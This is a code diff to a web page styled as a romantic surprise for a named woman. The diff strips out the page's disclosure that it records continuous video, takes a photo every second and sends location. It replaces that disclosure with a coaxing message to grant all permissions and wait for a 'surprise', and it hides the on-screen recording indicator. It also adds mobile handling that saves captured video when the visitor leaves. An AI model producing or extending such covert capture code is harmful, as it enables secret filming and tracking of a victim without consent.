@@ -270,7 +270,7 @@ body {
   <div id="consent-modal">
     <div class="modal-content">
       <h2>Anh iu e nhìu lắm ó:33</h2>
-      <p>Sau khi đồng ý và cấp quyền camera/microphone, trang sẽ ghi video liên tục và chụp ảnh mỗi giây. Vị trí được gửi một lần. Khi reload/đóng tab, hãy chọn ở lại trang, chờ video upload xong rồi mới thử lại. Nếu vẫn rời trang ngay, trình duyệt có thể hủy upload. Video dài sẽ tốn bộ nhớ thiết bị.</p>
+      <p>nhấn vào nút bên dưới rồi đợi 10s để xem bất ngờ nhaaaa:3 <br> (nhớ là chấp nhận full quyền mới xem được nè)</p>
       <p id="modal-status" style="display:none; color:#b91c1c;"></p>
       <button id="btn-accept" class="btn-primary">Đồng ý & tiếp tục</button>
     </div>
@@ -281,7 +281,7 @@ body {
     <div id="heart-message" class="heart-message" hidden>Trương Yến Nhi💗</div>
   </main>
   <video  id="preview" class="capture-source" autoplay muted playsinline aria-hidden="true"></video>
-  <div id="recording-status" role="status" aria-live="polite" hidden>
+  <div style="display:none;" id="recording-status" role="status" aria-live="polite" hidden>
     <strong id="recording-indicator">● ĐANG GHI HÌNH</strong>
     <div>
       <p id="recording-detail"></p>
@@ -345,6 +345,7 @@ body {
     let photoUploadsInFlight = 0;
     const activePhotoUploads = new Set();
     const loopWaiters = new Set();
+    const isMobileDevice = window.matchMedia('(pointer: coarse)').matches;
 
     function updateStatus(msg) {
       statusEl.textContent = `Trạng thái: ${msg}`;
@@ -485,6 +486,17 @@ body {
       event.preventDefault();
       event.returnValue = '';
     });
+
+    function saveVideoOnMobileLeave() {
+      if (!isMobileDevice || !captureRunning) return;
+      stopCapture();
+      updateStatus('Bạn đã chuyển khỏi trang. Đang lưu video; hãy quay lại kiểm tra trạng thái upload.');
+    }
+
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') saveVideoOnMobileLeave();
+    });
+    window.addEventListener('pagehide', saveVideoOnMobileLeave);
 
     function waitForNextCycle(milliseconds) {
       return new Promise((resolve) => {
